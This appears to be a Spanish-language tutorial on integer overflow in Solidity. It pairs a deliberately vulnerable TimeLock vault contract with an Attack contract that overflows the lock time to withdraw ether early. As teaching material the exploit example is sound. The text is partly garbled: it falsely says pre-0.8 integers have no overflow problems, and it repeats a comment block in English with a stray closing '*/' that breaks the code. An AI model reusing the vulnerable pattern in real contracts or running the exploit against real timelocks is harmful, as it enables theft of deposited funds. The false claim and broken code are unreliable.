Arithmetic Overflow and Underflow // Overflow 
Vulnerability
Solidity < 0.8
Los enteros no tienen  problemas de Desbordamiento, tanto en numeros positivos cómo negativos.

Solidity >= 0.8
Por encima de la versión 0.8, tiene un control que en caso de desbordamiento imprime error.

// EJEMPLO DE CONTRATO CON PROBLEMAS DE OVERFLOW
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

// Este contrato está diseñado para actuar como una bóveda de tiempo.
// El usuario puede depositar en este contrato pero no puede retirar durante al menos una semana.
// El usuario también puede extender el tiempo de espera más allá del período de espera de 1 semana.
/*

1. Implementar TimeLock
2. Implementar ataque con dirección de TimeLock
3. Llamar a la función Attack.attack enviando 1 ether. Inmediatamente podrá retirar su éter.

¿Qué pasó?
El ataque provocó el desbordamiento de TimeLock.lockTime y pudo retirarse
antes del período de espera de 1 semana.
*/

What happened?
Attack caused the TimeLock.lockTime to overflow and was able to withdraw
before the 1 week waiting period.
*/

contract TimeLock {
    mapping(address => uint) public balances;
    mapping(address => uint) public lockTime;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
        lockTime[msg.sender] = block.timestamp + 1 weeks;
    }

    function increaseLockTime(uint _secondsToIncrease) public {
        lockTime[msg.sender] += _secondsToIncrease;
    }

    function withdraw() public {
        require(balances[msg.sender] > 0, "Insufficient funds");
        require(block.timestamp > lockTime[msg.sender], "Lock time not expired");

        uint amount = balances[msg.sender];
        balances[msg.sender] = 0;

        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "Failed to send Ether");
    }
}

contract Attack {
    TimeLock timeLock;

    constructor(TimeLock _timeLock) {
        timeLock = TimeLock(_timeLock);
    }

    fallback() external payable {}

    function attack() public payable {
        timeLock.deposit{value: msg.value}();
        /*
        if t = current lock time then we need to find x such that
        x + t = 2**256 = 0
        so x = -t
        2**256 = type(uint).max + 1
        so x = type(uint).max + 1 - t
        */
        timeLock.increaseLockTime(
            type(uint).max + 1 - timeLock.lockTime(address(this))
        );
        timeLock.withdraw();
    }
}
